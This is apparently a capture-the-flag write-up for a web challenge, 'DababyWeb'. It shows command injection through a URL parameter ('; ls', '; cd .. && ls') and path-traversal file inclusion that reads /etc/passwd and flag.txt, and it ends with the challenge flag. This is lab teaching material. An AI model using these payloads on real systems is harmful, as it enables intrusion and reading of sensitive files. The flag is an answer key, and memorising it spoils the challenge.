
# Challenge Name: DababyWeb




![date](https://img.shields.io/badge/date-11.04.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![crypto category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![score](https://img.shields.io/badge/score-150-blue.svg)




## Detailed solution

Starting by opening challenge link http://34.72.118.158:6284/ 

![image](https://user-images.githubusercontent.com/72421091/114395792-53e25280-9b8c-11eb-9907-c71e46bd83d7.png)

We can see two links **Dababy's Name Judgement** and **Dababy's Images** 

Let's check the page source  
  
```html
<html
body, html{
height= 100%;
}

<div style ="background-image: url('/img/dababy.jpg')"
height= 100%;
background=size: cover;

>


<h1 style= color:black;font-size:40px;>
"Dababy has his secret message hidden somwhere, but how can we read it?"

<a href="fun.php">Dababy's Name Judgement</a>
<p></p>
<a href="fun1.php?file=suge">Dababy's Images</a>
</h1>
</html>
```  

We have two php files **fun.php** adn **fun1.php** let's  check them

**fun.php**

http://34.72.118.158:6284/fun.php  

![image](https://user-images.githubusercontent.com/72421091/114397694-78d7c500-9b8e-11eb-81ff-9120ae670566.png)

It's **DaBaby Cool Name Convertable** it gives the output : "our input" Is a Cool Name Lesss Go! 

We can see that we have a get parametre **string** fun.php?string=input

Let's try some command injection, i started with chaining commands using ";"  

Using the command **ls** http://34.72.118.158:6284/fun.php?string=%3B+ls  

Output : ``` dababy.sh Is a Cool Name Lesss Go! ```  

We can see that our command has been executed, we found a file in our directory 

I tried the read the file using cat ``` ; cat dababy.sh ``` 

Output : ``` Dababy say's no peaking ``` 

I tried also other commands but it shows the same thing or a picture xd :  

![image](https://user-images.githubusercontent.com/72421091/114401161-30baa180-9b92-11eb-87c1-2235c23b7f20.png)

I used the command cd and ls to search for a flag file using ;cd && ls  http://34.72.118.158:6284/fun.php?string=%3Bcd+..+%26%26+ls  

Output : ``` flag.txt Is a Cool Name Lesss Go! ```  

i found the flag.txt path 

**fun1.php** 

http://34.72.118.158:6284/fun1.php?file=suge

We can see the the fun1.php has a get parametre file that show a txt file suge at the first bloc 

![image](https://user-images.githubusercontent.com/72421091/114408307-cf4a0100-9b98-11eb-88fa-beab94179679.png)

I started by checking for LFI http://34.72.118.158:6284/fun1.php?file=../../../../../etc/passwd  

Output 

``` 
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
``` 

We were able to perform a local file inclusion to read the passwd file, now let's read our flag.txt 

http://34.72.118.158:6284/fun1.php?file=../flag.txt 

And we got our flag

## Flag

```
RS{J3TS0N_M4D3_4N0TH3R_0N3}
```
